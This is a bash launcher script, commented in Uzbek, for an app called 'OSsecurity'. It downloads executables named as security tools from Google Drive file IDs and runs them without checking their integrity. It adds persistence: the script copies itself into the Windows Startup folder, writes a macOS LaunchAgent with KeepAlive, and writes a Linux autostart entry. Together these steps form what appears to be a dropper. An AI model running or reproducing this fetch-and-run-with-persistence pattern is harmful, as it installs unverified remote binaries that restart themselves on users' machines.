#!/bin/bash

# ============================================================
# 1. Operatsion tizimni aniqlash
# ============================================================
OS="$(uname -s)"
case "$OS" in
    MINGW*|MSYS*|CYGWIN*)
        echo "Windows (Git Bash / MSYS / Cygwin) aniqlandi."
        OS_TYPE="windows"
        ;;
    Darwin*)
        echo "macOS aniqlandi."
        OS_TYPE="macos"
        ;;
    Linux*)
        echo "Linux aniqlandi."
        OS_TYPE="linux"
        ;;
    *)
        echo "Qo‘llab-quvvatlanmaydigan OS: $OS"
        exit 1
        ;;
esac

# ============================================================
# 2. gdown o‘rnatilganligini tekshirish va o‘rnatish (pipx yordamida)
# ============================================================
install_gdown() {
    echo "gdown o‘rnatilmoqda..."
    if command -v pipx &> /dev/null; then
        pipx install gdown
    elif command -v pip3 &> /dev/null; then
        # Agar pipx bo'lmasa, pip bilan --break-system-packages (Kali uchun)
        echo "pipx topilmadi, pip orqali o‘rnatilmoqda..."
        pip3 install --user --break-system-packages gdown 2>/dev/null || pip3 install --user gdown
    else
        echo "Xatolik: pip yoki pipx topilmadi. Iltimos, python3-pip yoki pipx ni o‘rnating."
        exit 1
    fi
    # PATH ga qo'shish
    export PATH="$HOME/.local/bin:/usr/local/bin:$PATH"
}

if ! command -v gdown &> /dev/null; then
    install_gdown
    # Qaytadan tekshirish
    if ! command -v gdown &> /dev/null; then
        echo "gdown o‘rnatilmadi. Iltimos, qo‘lda o‘rnating: pipx install gdown"
        exit 1
    fi
fi

# ============================================================
# 3. Google Drive'dan yuklab olish funksiyasi (gdown orqali)
# ============================================================
gdrive_download() {
    local file_id="$1"
    local output="$2"
    echo "Yuklab olinmoqda: fayl ID $file_id"
    gdown "https://drive.google.com/uc?id=$file_id" -O "$output"
}

# ============================================================
# 4. Umumiy sozlamalar
# ============================================================
APP_NAME="OSsecurity"
APP_INSTALL_DIR_WIN="C:\\Program Files\\OSsecurity"
APP_INSTALL_DIR_UNIX="$HOME/.local/share/ossecurity"

# Google Drive fayl ID'lari
FILE_ID_WIN="1dURd8BW-A6v6H4AWetg2OH1dH_UCqic2"
FILE_ID_MAC="1TTx2OPtTA_bv0RgBDlocYcKfpfl36kNz"
FILE_ID_LINUX="1TTx2OPtTA_bv0RgBDlocYcKfpfl36kNz"

# Windows executable nomi
APP_EXE_WIN="Windows_security.exe"
# Unix executable nomi (fayl nomiga mos)
APP_EXEC_UNIX="LinuxOS_security"# ============================================================
# 5. OS ga qarab harakat
# ============================================================
case "$OS_TYPE" in
    windows)
        # ---------- Windows ----------
        STARTUP_DIR="$APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
        SCRIPT_PATH="$(cygpath -w "$0")"
        
        if [ ! -f "$STARTUP_DIR\\$(basename "$0")" ]; then
            echo "Launcher Startup papkasiga joylashtirilmoqda..."
            cmd //c copy "$SCRIPT_PATH" "$STARTUP_DIR"
        fi
        
        if [ ! -f "$APP_INSTALL_DIR_WIN\\$APP_EXE_WIN" ]; then
            echo "$APP_NAME topilmadi. Yuklab olinmoqda va o‘rnatilmoqda..."
            mkdir -p "$APP_INSTALL_DIR_WIN" 2>/dev/null
            gdrive_download "$FILE_ID_WIN" "/tmp/$APP_EXE_WIN"
            if [ $? -ne 0 ] || [ ! -s "/tmp/$APP_EXE_WIN" ]; then
                echo "Yuklab olish muvaffaqiyatsiz."
                exit 1
            fi
            cp "/tmp/$APP_EXE_WIN" "$APP_INSTALL_DIR_WIN\\$APP_EXE_WIN"
            echo "O‘rnatish tugallandi."
        fi
        
        cmd //c start "" "$APP_INSTALL_DIR_WIN\\$APP_EXE_WIN"
        ;;
        
    macos)
        # ---------- macOS ----------
        APP_INSTALL_DIR="$APP_INSTALL_DIR_UNIX"
        APP_EXEC="$APP_EXEC_UNIX"
        
        if [ ! -d "$APP_INSTALL_DIR" ] || [ ! -f "$APP_INSTALL_DIR/$APP_EXEC" ]; then
            echo "$APP_NAME topilmadi. Yuklab olinmoqda va o‘rnatilmoqda..."
            mkdir -p "$APP_INSTALL_DIR"
            gdrive_download "$FILE_ID_MAC" "/tmp/$APP_NAME"
            if [ $? -ne 0 ] || [ ! -s "/tmp/$APP_NAME" ]; then
                echo "Yuklab olish muvaffaqiyatsiz."
                exit 1
            fi
            mv "/tmp/$APP_NAME" "$APP_INSTALL_DIR/$APP_EXEC"
            chmod +x "$APP_INSTALL_DIR/$APP_EXEC"
            echo "O‘rnatish tugallandi."
        fi
        
        # Autostart (LaunchAgent)
        AUTOSTART_DIR="$HOME/Library/LaunchAgents"
        AUTOSTART_FILE="$AUTOSTART_DIR/com.ossecurity.launcher.plist"
        mkdir -p "$AUTOSTART_DIR"
        cat > "$AUTOSTART_FILE" <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.ossecurity.launcher</string>
    <key>ProgramArguments</key>
    <array>
        <string>$APP_INSTALL_DIR/$APP_EXEC</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
</dict>
</plist>
EOF
        launchctl load -w "$AUTOSTART_FILE" 2>/dev/null
        
        "$APP_INSTALL_DIR/$APP_EXEC" &
        ;;
        
    linux)
        # ---------- Linux ----------
        APP_INSTALL_DIR="$APP_INSTALL_DIR_UNIX"
        APP_EXEC="$APP_EXEC_UNIX"
        
        if [ ! -d "$APP_INSTALL_DIR" ] || [ ! -f "$APP_INSTALL_DIR/$APP_EXEC" ]; then
            echo "$APP_NAME topilmadi. Yuklab olinmoqda va o‘rnatilmoqda..."
            mkdir -p "$APP_INSTALL_DIR"
            gdrive_download "$FILE_ID_LINUX" "/tmp/$APP_NAME"
            if [ $? -ne 0 ] || [ ! -s "/tmp/$APP_NAME" ]; then
                echo "Yuklab olish muvaffaqiyatsiz."
                exit 1
            fi
            mv "/tmp/$APP_NAME" "$APP_INSTALL_DIR/$APP_EXEC"
            chmod +x "$APP_INSTALL_DIR/$APP_EXEC"
            echo "O‘rnatish tugallandi."
        fi
        
        # Autostart (XDG)
        AUTOSTART_DIR="$HOME/.config/autostart"
        AUTOSTART_FILE="$AUTOSTART_DIR/ossecurity.desktop"
        mkdir -p "$AUTOSTART_DIR"
        cat > "$AUTOSTART_FILE" <<EOF
[Desktop Entry]
Type=Application
Name=$APP_NAME
Exec=$APP_INSTALL_DIR/$APP_EXEC
Hidden=false
NoDisplay=false
X-GNOME-Autostart-enabled=true
EOF
        
        "$APP_INSTALL_DIR/$APP_EXEC" &
        ;;
esac

echo "Launcher ishini tugatdi."
exit 0